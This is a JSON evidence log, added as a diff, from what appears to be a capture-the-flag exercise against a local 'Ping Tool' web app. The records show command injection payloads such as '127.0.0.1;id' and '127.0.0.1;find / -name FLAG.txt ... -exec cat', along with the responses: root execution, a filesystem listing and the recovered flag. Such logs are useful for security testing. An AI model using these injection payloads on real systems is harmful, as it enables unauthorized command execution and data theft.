@@ -1,0 +1,41 @@
+{
+ "schema": 1,
+ "records": [
+  {
+   "evidence_id": "EV-001",
+   "kind": "http",
+   "summary": "GET http://127.0.0.1:53261/ -> 200 (423B)",
+   "detail": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Ping Tool</title>\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/styles.css\">\n</head>\n<body>\n    <div class=\"container\">\n        <h1>Ping Tool</h1>\n        <form action=\"/ping\" method=\"post\">\n            <input type=\"text\" name=\"ip_address\" placeholder=\"Enter IP Address\" required>\n            <button type=\"submit\">Ping</button>\n        </form>\n    </div>\n</body>\n</html>"
+  },
+  {
+   "evidence_id": "EV-002",
+   "kind": "http",
+   "summary": "POST http://127.0.0.1:53261/ping -> 200 (616B)",
+   "detail": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Ping Result</title>\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/styles.css\">\n</head>\n<body>\n    <div class=\"container\">\n        <h1>Ping Result for 127.0.0.1;id</h1>\n        <pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.053 ms\n64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.033 ms\n\n--- 127.0.0.1 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss, time 1026ms\nrtt min/avg/max/mdev = 0.033/0.043/0.053/0.010 ms\nuid=0(root) gid=0(root) groups=0(root)\n</pre>\n    </div>\n</body>\n</html>"
+  },
+  {
+   "evidence_id": "EV-003",
+   "kind": "http",
+   "summary": "POST http://127.0.0.1:53261/ping -> 200 (587B)",
+   "detail": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Ping Result</title>\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/styles.css\">\n</head>\n<body>\n    <div class=\"container\">\n        <h1>Ping Result for 127.0.0.1;cat FLAG.txt</h1>\n        <pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.057 ms\n64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.048 ms\n\n--- 127.0.0.1 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss, time 1025ms\nrtt min/avg/max/mdev = 0.048/0.052/0.057/0.004 ms\n</pre>\n    </div>\n</body>\n</html>"
+  },
+  {
+   "evidence_id": "EV-004",
+   "kind": "http",
+   "summary": "POST http://127.0.0.1:53261/ping -> 200 (601B)",
+   "detail": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Ping Result</title>\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/styles.css\">\n</head>\n<body>\n    <div class=\"container\">\n        <h1>Ping Result for 127.0.0.1;cat FLAG.txt | head -c 300</h1>\n        <pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.024 ms\n64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.028 ms\n\n--- 127.0.0.1 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss, time 1018ms\nrtt min/avg/max/mdev = 0.024/0.026/0.028/0.002 ms\n</pre>\n    </div>\n</body>\n</html>"
+  },
+  {
+   "evidence_id": "EV-005",
+   "kind": "http",
+   "summary": "POST http://127.0.0.1:53261/ping -> 200 (1906B)",
+   "detail": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Ping Result</title>\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/styles.css\">\n</head>\n<body>\n    <div class=\"container\">\n        <h1>Ping Result for 127.0.0.1;ls -la / ; find / -name FLAG.txt 2&gt;/dev/null</h1>\n        <pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.043 ms\n64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.028 ms\n\n--- 127.0.0.1 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss, time 1000ms\nrtt min/avg/max/mdev = 0.028/0.035/0.043/0.007 ms\ntotal 72\ndrwxr-xr-x   1 root root 4096 Nov 12 05:12 .\ndrwxr-xr-x   1 root root 4096 Nov 12 05:12 ..\n-rwxr-xr-x   1 root root    0 Nov 12 05:12 .dockerenv\n-rw-r--r--   1 root root   22 Nov 12 05:12 FLAG.txt\ndrwxr-xr-x   4 root root 4096 Nov 12 05:12 app\nlrwxrwxrwx   1 root root    7 Sep 26  2024 bin -&gt; usr/bin\ndrwxr-xr-x   2 root root 4096 Aug 14  2024 boot\ndrwxr-xr-x   5 root root  340 Nov 12 05:12 dev\ndrwxr-xr-x   1 root root 4096 Nov 12 05:12 etc\ndrwxr-xr-x   2 root root 4096 Aug 14  2024 home\nlrwxrwxrwx   1 root root    7 Sep 26  2024 lib -&gt; usr/lib\nlrwxrwxrwx   1 root root    9 Sep 26  2024 lib64 -&gt; usr/lib64\ndrwxr-xr-x   2 root root 4096 Sep 26  2024 media\ndrwxr-xr-x   2 root root 4096 Sep 26  2024 mnt\ndrwxr-xr-x   2 root root 4096 Sep 26  2024 opt\ndr-xr-xr-x 387 root root    0 Nov 12 05:12 proc\n-rwxr-xr-x   1 root root   12 Nov 11 04:12 requirements.txt\ndrwx------   1 root root 4096 Sep 27  2024 root\ndrwxr-xr-x   3 root root 4096 Sep 26  2024 run\nlrwxrwxrwx   1 root root    8 Sep 26  2024 sbin -&gt; usr/sbin\ndrwxr-xr-x   2 root root 4096 Sep 26  2024 srv\ndr-xr-xr-x  13 root root    0 Nov 12 05:12 sys\ndrwxrwxrwt   1 root root 4096 Sep 27  2024 tmp\ndrwxr-xr-x   1 root root 4096 Sep 26  2024 usr\ndrwxr-xr-x   1 root root 4096 Sep 26  2024 var\n/FLAG.txt\n</pre>\n    </div>\n</body>\n</html>"
+  },
+  {
+   "evidence_id": "EV-006",
+   "kind": "http",
+   "summary": "FLAG-LIKE flag{c817ececdad021cb} | POST http://127.0.0.1:53261/ping -> 200 (659B)",
+   "detail": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Ping Result</title>\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/styles.css\">\n</head>\n<body>\n    <div class=\"container\">\n        <h1>Ping Result for 127.0.0.1;find / -name &#39;FLAG.txt&#39; 2&gt;/dev/null -exec cat {} \\;</h1>\n        <pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.105 ms\n64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.067 ms\n\n--- 127.0.0.1 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss, time 1007ms\nrtt min/avg/max/mdev = 0.067/0.086/0.105/0.019 ms\nflag{c817ececdad021cb}</pre>\n    </div>\n</body>\n</html>"
+  }
+ ]
+}
